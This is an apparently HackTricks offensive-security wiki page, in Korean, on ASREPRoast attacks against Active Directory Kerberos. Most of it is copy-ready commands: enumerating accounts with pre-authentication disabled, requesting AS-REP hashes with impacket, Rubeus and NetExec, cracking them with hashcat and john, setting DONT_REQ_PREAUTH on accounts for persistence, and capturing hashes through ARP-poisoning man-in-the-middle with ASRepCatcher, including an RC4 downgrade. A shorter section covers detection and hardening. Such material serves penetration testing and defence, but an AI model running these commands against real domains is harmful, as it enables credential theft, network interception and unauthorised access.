# ASREPRoast

{{#include ../../banners/hacktricks-training.md}}

## ASREPRoast

ASREPRoast는 **Kerberos pre-authentication required attribute**가 없는 사용자를 악용하는 security attack입니다. 기본적으로 이 vulnerability를 통해 attackers는 사용자의 password 없이도 Domain Controller(DC)에 사용자 authentication을 요청할 수 있습니다. 그러면 DC는 사용자의 password에서 파생된 key로 암호화된 message로 응답하며, attackers는 이를 offline에서 crack하여 사용자의 password를 알아낼 수 있습니다.

이 attack의 주요 requirements는 다음과 같습니다.

- **Kerberos pre-authentication이 없음**: 대상 사용자에게 이 security feature가 활성화되어 있지 않아야 합니다.
- **Domain Controller(DC)에 연결**: Attackers는 requests를 보내고 encrypted messages를 받기 위해 DC에 access할 수 있어야 합니다.
- **Optional domain account**: Domain account가 있으면 LDAP queries를 통해 vulnerable users를 더 효율적으로 식별할 수 있습니다. 이러한 account가 없으면 attackers는 usernames를 추측해야 합니다.

#### 취약한 사용자 열거(domain credentials 필요)
```bash:Using Windows
Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
```

```bash:Using Linux
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 get search --filter '(&(userAccountControl:1.2.840.113556.1.4.803:=4194304)(!(UserAccountControl:1.2.840.113556.1.4.803:=2)))' --attr sAMAccountName
```
#### AS_REP 메시지 요청
```bash:Using Linux
# Installed package entrypoint (same logic as GetNPUsers.py)
impacket-GetNPUsers -no-pass -usersfile usernames.txt -dc-ip <dc_ip> <domain>/ -format hashcat -outputfile hashes.asreproast
# Use domain creds to LDAP-enumerate roastable users and request them
impacket-GetNPUsers <domain>/<user>:<pass> -request -format hashcat -outputfile hashes.asreproast
# If you are running directly from the examples/ directory
python GetNPUsers.py -no-pass <domain>/ -usersfile usernames.txt -format hashcat -outputfile hashes.asreproast
```

```bash:Using Windows
.\Rubeus.exe asreproast /format:hashcat /outfile:hashes.asreproast [/user:username] [/aes]
Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
```
> [!WARNING]
> Rubeus는 기본적으로 **RC4**를 요청하므로 Event ID **4768**에는 일반적으로 **preauth type 0**과 **ticket encryption type 0x17**이 표시됩니다. **`/aes`**를 추가하거나 대상에서 RC4가 비활성화되어 있으면 **AES etypes**가 표시될 수 있습니다.<sup>[[2]](#references)</sup>

#### 빠른 one-liners (Linux)

- 먼저 Kerberos userenum을 사용하여 잠재적인 대상(예: leaked build paths에서)을 열거합니다: `kerbrute userenum users.txt -d domain --dc dc.domain`
- NetExec을 사용하여 유효한 creds 없이 전체 username 목록을 대상으로 Roast합니다: `netexec ldap <dc> -u users.txt -p '' --asreproast out.asreproast`<sup>[[3]](#references)[[4]](#references)</sup>
- creds가 있다면 NetExec이 LDAP를 쿼리하고 Roast 가능한 모든 계정을 대신 요청하도록 합니다: `netexec ldap <dc> -u <user> -p '<pass>' --asreproast out.asreproast [--kdcHost <dc_fqdn>]`<sup>[[3]](#references)</sup>
- 출력이 **`$krb5asrep$23$`**로 시작하면 Hashcat **`-m 18200`**으로 crack합니다. **`$krb5asrep$17$`** 또는 **`$krb5asrep$18$`**로 시작하면 John **`--format=krb5asrep`**을 우선 사용합니다.<sup>[[1]](#references)[[2]](#references)</sup>

### Cracking

모든 AS-REP roast가 RC4라고 가정하지 마세요. 최신 tooling은 요청되거나 협상된 enctype에 따라 **RC4** (`$krb5asrep$23$`) 또는 **AES** (`$krb5asrep$17$` / `$krb5asrep$18$`)를 반환할 수 있습니다. **`hashcat -m 18200`**은 **etype 23**용이며, **John**은 **17/18/23**에 대해 `krb5asrep`를 직접 처리합니다.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
john --format=krb5asrep --wordlist=passwords_kerb.txt hashes.asreproast
hashcat -m 18200 -a 0 hashes.asreproast passwords_kerb.txt # RC4 / etype 23
```
### Persistence

**GenericAll** 권한(또는 속성을 작성할 권한)이 있는 사용자의 경우 **preauth**를 강제할 필요가 없습니다:
```bash:Using Windows
# Toggle DONT_REQ_PREAUTH on (run it again to toggle it back off during cleanup)
Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
```

```bash:Using Linux
# Enable ASREPRoastability
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac -f DONT_REQ_PREAUTH 'target_user'
# Cleanup
bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 remove uac -f DONT_REQ_PREAUTH 'target_user'
```
### 탐지 및 hardening

성공적인 roast는 DC에 `Status=0x0` 및 `PreAuthType=0`인 **4768** 이벤트를 생성합니다. 탐지 시 RC4를 필수 조건으로 지정하지 마세요. `TicketEncryptionType=0x17`은 유용한 weak-encryption 신호이지만, 공격자는 AES를 요청할 수 있습니다(이벤트 로그 값 `0x11`/`0x12`). Windows Server 2016 이상에서 2025년 1월 14일(또는 그 이후) cumulative update가 설치된 경우, 이벤트 4768의 version 2에는 `ClientAdvertizedEncryptionTypes`, 계정/DC가 지원하는 etypes 및 사용 가능한 키도 표시됩니다.<sup>[[5]](#references)</sup>

실용적인 hunt에서는 계정에 AES 키가 있는데 클라이언트가 RC4만 광고하는 경우를 표시한 다음, 하나의 source IP에서 여러 no-preauth 사용자를 대상으로 발생한 burst를 상호 연관시킵니다. 모든 `PreAuthType=0` 이벤트에 alert를 발생시키기보다는 정상적인 예외를 baseline으로 설정하세요.

근본적인 해결 방법은 반드시 필요하지 않은 모든 사용자의 **Do not require Kerberos preauthentication** 설정을 해제하고 노출된 계정의 password를 변경하는 것입니다. 예외를 제거할 수 없다면 길고 무작위로 생성된 password와 최소 권한을 사용하세요. RC4를 비활성화하면 cracking cost가 증가하지만 AES AS-REP 응답도 offline-crackable하므로 roastability가 제거되지는 않습니다.<sup>[[2]](#references)[[5]](#references)</sup>

## 자격 증명 없이 ASREProast

on-path attacker는 정상적인 preauthenticated AS exchange 중 반환되는 AS-REP를 캡처하고, 암호화된 부분을 offline cracking용으로 변환할 수 있습니다. classic ASREPRoasting과 달리 `DONT_REQ_PREAUTH`가 필요하지 않습니다. 그러나 실제로 Kerberos exchange가 intercepted된 계정만 얻을 수 있습니다. **ASRepCatcher**는 기본적으로 one-way ARP poisoning을 사용해 해당 위치를 확보하며, `--disable-spoofing`을 사용하면 다른 MitM technique에서 가져온 traffic을 처리할 수도 있습니다.<sup>[[6]](#references)</sup>\
no-preauth principal에서 **TGT** 대신 **service ticket**을 반환하는 관련 no-credential trick을 원한다면 [Kerberoast](kerberoast.md)를 참조하세요.

`relay` mode에서 [ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)는 intercepted AS-REQ를 전달하고 양쪽 모두 여전히 허용하는 경우 **RC4**를 강제합니다. `listen`은 packet을 변경하지 않으므로 client와 DC가 협상한 enctype을 그대로 캡처합니다. 가능하면 전체 subnet을 대상으로 하지 말고 `-t`/`-tf`로 poisoning 범위를 지정하세요.<sup>[[6]](#references)</sup>
```bash
# Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
ASRepCatcher relay -dc $DC_IP

# Disabling ARP spoofing, the mitm position must be obtained differently
ASRepCatcher relay -dc $DC_IP --disable-spoofing

# Passive listening of AS-REP packets, no packet alteration
ASRepCatcher listen

# Scope targets and save directly in Hashcat format
ASRepCatcher relay -dc $DC_IP -t 192.168.1.0/24 -outfile hashes.asreproast -format hashcat
```
---



---

## References

- [1] [AS-REP Roasting – ired.team](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
- [2] [Roasting AES AS-REPs – MWR CyberSec](https://mwrcybersec.com/roasting-aes-as-reps)
- [3] [NetExec Wiki – ASREPRoast](https://www.netexec.wiki/ldap-protocol/asreproast)
- [4] [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
- [5] [Microsoft – 이벤트 4768: Kerberos 인증 티켓이 요청됨](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/auditing/event-4768)
- [6] [Yaxxine7 – ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher)
{{#include ../../banners/hacktricks-training.md}}
